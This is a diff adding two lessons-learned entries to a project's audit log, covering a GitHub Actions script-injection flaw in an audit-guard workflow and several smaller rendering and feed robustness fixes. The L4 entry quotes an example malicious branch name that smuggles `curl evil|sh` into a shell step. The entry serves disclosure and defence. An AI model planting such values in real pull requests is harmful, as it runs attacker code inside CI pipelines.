@@ -196,3 +196,158 @@ lesson with STATUS `absorbed`.
 detection-logic red fixture needed for either, per the reasoning above); the
 remaining 3 (verify.py prompt-injection design, heal.py relevance validation,
 workflow SHA pinning) are still open.
+
+---
+
+## L4 — GitHub Actions script injection defeats the audit-guard exemption (2026-07-08)
+
+**LESSON:** A security control's own implementation can itself be the
+weakest link. The actor+branch-matching exemption added to
+`scripts/audit_guard.py` (so the daily pipeline's own PR can rewrite
+`data/registers/`/`data/seen-items.json` without tripping the forbidden-path
+guard) was correctly designed — only `github-actions[bot]` on a
+`digest/<timestamp>` branch is exempt, and neither piece is forgeable by a
+human PR author. But the workflow wiring that FED those values to the
+script was not: `.github/workflows/audit-guard.yml` interpolated
+`${{ github.event.pull_request.head.sha }}`, `${{
+github.event.pull_request.user.login }}`, and — critically — `${{
+github.head_ref }}` directly into a `run:` shell line. `github.head_ref` is
+a git branch name, fully controlled by whoever opens the PR, and git ref
+names permit `$`, `` ` ``, `(`, `)` (only space/`~^:?*[`/control chars/a
+leading dot are forbidden) — unlike a GitHub login, which is restricted to
+`[A-Za-z0-9-]`. A PR from a branch named `` x$(curl evil|sh) `` would have
+had that command substituted and executed by bash inside the guard job
+itself, before the actor/branch check it was meant to feed ever ran — total
+compromise of the one workflow whose entire job is catching hand-edited
+pipeline memory.
+
+**INVARIANT:** Any GitHub Actions context value an external PR author can
+set to arbitrary text (a branch name, PR title/body, issue/comment/review
+body, commit message) must never be interpolated directly into a `run:`
+shell block. It must be passed through `env:` and referenced as a shell
+variable — the shell parses the *variable reference* at that point, never
+the *value*, so attacker-controlled text stays inert data. Only
+`github.event.pull_request.user.login` (a GitHub login, charset-restricted)
+and similarly structurally-constrained fields are exempt from this rule.
+
+**EVIDENCE:** Found by inspection during a proactively-scheduled 4-new-angle
+Fable audit round (no exploit was attempted against the live repo); the
+vulnerable line was `.github/workflows/audit-guard.yml`'s `run:` step,
+introduced in the same PR that added the actor/branch exemption itself. The
+git-ref-name permissiveness (verified against `git check-ref-format`'s
+actual rules, not assumed) is what makes this concretely exploitable rather
+than theoretical.
+
+**CHECK:** `scripts/audit_checks/check_workflow_injection.py` — scans every
+`.github/workflows/*.yml` file's `run:` step bodies (both single-line and
+block-scalar forms, correctly excluding sibling `env:` blocks) for a
+documented list of untrusted GitHub context expressions used directly in
+shell text. Added to `PROTECTED_CHECK_IDS` given the severity: this check
+protects the mechanism that protects every other guard.
+
+**RULE:** `.github/workflows/audit-guard.yml`'s vulnerable step now passes
+all four PR-derived values through `env:` and references them as
+`$PR_BASE_REF`/`$PR_HEAD_SHA`/`$PR_ACTOR`/`$PR_HEAD_REF` in the shell
+command — the shell never re-parses their content.
+
+**STATUS:** absorbed (`scripts/audit_checks/fixtures/test_l4_workflow_injection.py`
+fires on the exact pre-fix pattern as its red fixture, is clean on the
+env:-based fix as its green fixture, and confirms the live repo's real
+workflow files are clean).
+
+---
+
+## L5 — smaller robustness gaps found by the same 4-new-angle Fable audit round (2026-07-08)
+
+**LESSON:** Same shape as L3: several smaller gaps surfaced from the same
+audit round that found L4, none tied to a known incident, recorded so they
+aren't silently rediscovered.
+
+**EVIDENCE / STATUS per item:**
+- **Fixed:** `check_render_drops.py` compared item ids as plain SETS
+  (`ids_in - ids_out`). If two items in `data/digest.json` happen to share
+  an id and `sanitize_digest` keeps one while dropping the other, the id is
+  present on both sides of the set difference and the drop is invisible.
+  Now compares per-id occurrence COUNTS (`collections.Counter`), so a
+  duplicate-id partial drop is caught too.
+- **Fixed:** `render.sanitize_digest` had no defense against C0 control
+  characters (illegal in XML 1.0 — breaks `docs/feed.xml` outright for
+  every RSS reader on the very first poisoned title) or lone/unpaired UTF-16
+  surrogate code points (`json.loads` accepts an unpaired `\uD800`-style
+  escape into a plain Python str without complaint; `str.encode("utf-8")`
+  then raises, crashing the entire render, not just the feed). A new
+  `_clean_text` helper strips both classes of character from every
+  user/AI-authored free-text field before it reaches either output
+  (`title`, `source`, `summary`, `so_what`, `top_of_mind`, `run_log` notes,
+  radar labels, health entry name/note, `verification.checked`
+  note/against).
+- **Fixed:** `check_docs_feed_parity.py` reported an unparseable
+  `docs/feed.xml` as `warn`. Promoted to `critical` — a feed that doesn't
+  parse is total breakage for every subscriber (Outlook's RSS folder,
+  feedparser, etc.), not a soft signal.
+- **Fixed:** `check_enum_constant_freeze.py` froze the *set* of valid
+  jurisdiction/type codes but nothing about a code's *meaning*.
+  `page.html`'s `JURIS_FULL` (code → display name) and `JURIS_ORDER`
+  (display/priority order) could be silently relabeled or reordered with no
+  warning anywhere — on a project whose whole editorial focus is
+  jurisdiction correctness, this is a real, high-impact gap. Both are now
+  extracted (narrow regex, matching the existing `TYPE_LABEL`/`BUCKETS`
+  extraction's own documented tradeoff) and frozen in
+  `audit/enum-snapshot.json` alongside the existing enum sets.
+  `PAGE_HTML_TYPE_LABEL_KEYS`/`PAGE_HTML_BUCKET_TYPES` remain key-only/
+  flattened-set (a type's display LABEL text and its bucket-membership
+  mapping, as opposed to jurisdiction's, are lower-traffic surfaces on this
+  project and are left as a **still-open, lower-priority** follow-up rather
+  than done in the same pass).
+- **Fixed:** the week-in-review print view's `buildWeekView()` iterated
+  ALL `DIGEST.items` rather than the same 7-day window `rangeItems("7")`
+  uses for the on-screen "Last 7 days" chip — contradicting its own CSS
+  comment ("prints ONLY the 7-day view"). Since the pipeline retains ~8
+  days, this could silently include one extra day in the printed output
+  that the on-screen range excludes. Now calls `rangeItems("7")` directly,
+  so the two can never drift apart again.
+- **Not a bug, verified directly:** the OG/social-card audit
+  (`scripts/render.py`'s `_og_strings`) found a REAL, actively-live bug —
+  naive `[:200]` slicing cut `og:description` mid-sentence with no
+  ellipsis whenever `top_of_mind` ran long (it does, today, at 321 chars).
+  Fixed by routing through the pre-existing `_truncate_gracefully` helper
+  (which already existed for exactly this reason elsewhere in the file, but
+  wasn't used here) — no new check needed, this is the same helper
+  `render_drops`'s own docstring precedent already relies on elsewhere.
+- **Still open, lower priority:** `check_docs_feed_parity.py`'s item-set +
+  `generated_at` comparison would not catch a per-item CONTENT edit (title/
+  summary/jurisdiction changed in `data/digest.json` without re-rendering)
+  that doesn't also change the id set or `generated_at` — a full
+  content-hash parity check would close this but wasn't built in this
+  round; noted as a candidate for the next audit pass.
+- **Not a bug, verified directly:** the print/week-in-review view's
+  `beforeprint`/`afterprint` `<details>`-forcing logic, HKT day-grouping,
+  and HTML-escaping were all confirmed correct via hands-on Playwright
+  testing (collapsed briefs force-open under print media and correctly
+  restore afterward; day grouping uses the same shared `hkDayKey()` as the
+  rest of the app; injected markup/XSS probes render as inert text). A
+  headless-Chromium-only quirk (`afterprint` never fires after a scripted
+  `window.print()` in headless mode, leaving `dataset.print` stuck) is
+  headless-test-harness-only, not user-facing in a real browser, and is not
+  treated as a bug.
+
+**CHECK:** `scripts/audit_checks/fixtures/test_l5_robustness_gaps.py` covers
+the four fixed items with red/green assertions (duplicate-id masking,
+control-char/surrogate stripping + feed still parses, unparseable-feed
+severity, JURIS_FULL relabeling detection). The `buildWeekView` and OG-string
+fixes were verified directly via Playwright / a live re-render rather than a
+audit_checks-style fixture (neither is a detection-logic gap in the audit
+harness itself).
+
+**RULE:** Any new free-text field added to the digest schema must be routed
+through `render._clean_text` before it reaches `docs/feed.xml` or the JSON
+embed — this is not automatic; a future field addition that skips it would
+reopen this exact class of gap.
+
+**STATUS:** absorbed — all four audit_checks-covered items have a
+red-fixture-backed check (`test_l5_robustness_gaps.py`); the two
+Playwright/render-verified items (buildWeekView, OG truncation) are fixed
+and directly verified but have no dedicated red-fixture module, matching L3's
+precedent for logging/severity-only changes; the two still-open items
+(TYPE_LABEL/BUCKETS full-mapping freeze, docs_feed_parity content-hash
+parity) remain candidates for a future audit round.
